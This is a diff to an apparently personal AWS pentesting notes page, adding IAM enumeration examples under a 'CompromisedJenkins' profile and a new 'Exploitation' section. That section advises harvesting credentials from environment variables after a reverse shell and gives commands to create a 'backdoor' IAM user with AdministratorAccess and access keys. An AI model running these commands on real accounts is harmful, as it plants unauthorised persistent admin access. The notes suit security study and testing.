@@ -82,7 +82,7 @@ nslookup 3.84.154.5</code></pre>
                     <p>AWS cli works using profiles and credentials stored in the <b>~/.aws/credentials</b> file.</p>
                     <p>You can define a profile by using the following command which will prompt you to enter your credentials:</p>
                     <pre><code class="language-bash"></code>aws configure --profile amethyst-admin</code></pre>
-                    <p>Then check if you done it correctly</p>
+                    <p>Then check if you done it correctly. <b>Using the following command also provides you with the username of the account</b></p>
                     <pre><code class="language-bash">aws sts get-caller-identity --profile amethyst-admin</code></pre>
                     <b>Warning: Have in mind that this actions are logged</b> 
                 </ul>    
@@ -192,13 +192,13 @@ aws --profile target iam get-account-authorization-details  #Get all information
                     <h4>Managed Policies</h4>
                     <ul>
                         <p> AWS managed policies are designed to provide permissions for many common use cases. They make it easier for you to get started with assigning permissions to users, groups, and roles than if you had to write the policies yourself.</p>
-                        <pre><code class="language-bash">aws --profile target iam list-group-policies --group-name support</code></pre>
+                        <pre><code class="language-bash">aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin</code></pre>
                         <b>these policies often grant broader permissions than might be desired. Ideally, they should be paired with other more-restrictive policies to ensure fine-grained permission control.</b>
                     </ul>
                     <h4>Inline Policies</h4>
                     <ul>
                         <p>Inline policies are embedded directly within the user, group, or role and belong exclusively to that principal.</p>
-                        <pre><code class="language-bash">aws --profile target iam list-attached-group-policies --group-name support</code></pre>
+                        <pre><code class="language-bash">aws --profile target iam list-user-policies --user-name clouddesk-plove</code></pre>
                     </ul>    
                     <p>Now we can check the version of that policy:</p>
                     <pre><code class="language-bash">aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"</code></pre>
@@ -211,6 +211,23 @@ aws --profile target iam get-account-authorization-details  #Get all information
                     <p>We can use the following command to gather account summary information:</p>
                     <pre><code class="language-bash">aws --profile target iam get-account-summary | tee account-summary.json</code></pre>
                     <p>An important thing to note is the parameter <b>"AccountMFAEnabled": 0</b> which indicates that Multi-Factor Authentication is not enabled for the account.</p>
+                </ul>
+
+                <h3>Exploitation</h3>
+                <ul>
+                    <h4>Checking for credentials</h4>
+                    <ul>
+                        <p>In case you found a way to obtain a reverse shell inside the compromised AWS envioronment you must check <b>environmental variables</b> since credentials for the AWS account you are impersonating will be there</p>
+                    </ul>
+                    <h4>Creating a Backdoor</h4>
+                    <ul>
+                        <p>The best way of maintaning access is through a backdoor. In AWS a backdoor could be the creation of an administrator account. Create an admin account by using</p>
+                        <pre><code class="language-bash">aws --profile CompromisedJenkins iam create-user --user-name backdoor</code></pre>
+                        <p>Now attach it to the administrators group:</p>
+                        <pre><code class="language-bash">aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</code></pre>
+                        <p>Create credentials (Access key and Secret key):</p>
+                        <pre><code class="language-bash">aws --profile CompromisedJenkins iam create-access-key --user-name backdoor</code></pre>
+                    </ul>    
                 </ul>
             </ul>
         </div>
